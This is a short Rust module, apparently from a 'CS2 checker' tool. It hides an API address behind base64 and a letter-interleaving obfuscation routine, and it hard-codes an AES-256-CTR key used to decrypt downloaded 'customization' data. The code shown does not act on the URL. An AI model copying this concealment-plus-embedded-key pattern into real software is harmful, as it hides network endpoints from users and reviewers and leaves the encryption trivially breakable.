use aes::cipher::{KeyIvInit, StreamCipher};
use aes::Aes256;

type Aes256Ctr = ctr::Ctr128BE<Aes256>;

const _OBFUSCATED_URL: &str = "htps:/c2ekr.uaibla";

const BASE64_API_URL: &str = "aHR0cHM6Ly9jczJjaGVja2VyLnJ1L2FwaS9wdWJsaWM=";

const ENCRYPTION_KEY: &[u8; 32] = b"CS2_CHECKER_SECURE_KEY_2024_V1\x00\x00";

pub fn init() {
    let _url = decode_api_url();
    let _ = _url;
}

pub fn decode_api_url() -> String {
    use base64::Engine;
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(BASE64_API_URL)
        .unwrap_or_default();
    String::from_utf8(decoded).unwrap_or_default()
}

#[allow(dead_code)]
pub fn deobfuscate_url(obfuscated: &str) -> String {
    let mut result = String::new();
    let chars: Vec<char> = obfuscated.chars().collect();
    let missing = "ts/s2hce.r/p/ulc";
    let mut mi = 0;

    for (i, ch) in chars.iter().enumerate() {
        result.push(*ch);
        if mi < missing.len() {
            result.push(missing.as_bytes()[mi] as char);
            mi += 1;
        }
    }
    result
}

pub fn decrypt_customization(data: &[u8]) -> Result<Vec<u8>, String> {
    if data.len() < 16 {
        return Err("Data too short".to_string());
    }

    let iv = &data[..16];
    let ciphertext = &data[16..];

    let mut buf = ciphertext.to_vec();
    let mut cipher = Aes256Ctr::new(ENCRYPTION_KEY.into(), iv.into());
    cipher.apply_keystream(&mut buf);

    Ok(buf)
}

#[allow(dead_code)]
pub fn encrypt_data(plaintext: &[u8], iv: &[u8; 16]) -> Vec<u8> {
    let mut buf = plaintext.to_vec();
    let mut cipher = Aes256Ctr::new(ENCRYPTION_KEY.into(), iv.into());
    cipher.apply_keystream(&mut buf);

    let mut result = iv.to_vec();
    result.extend_from_slice(&buf);
    result
}

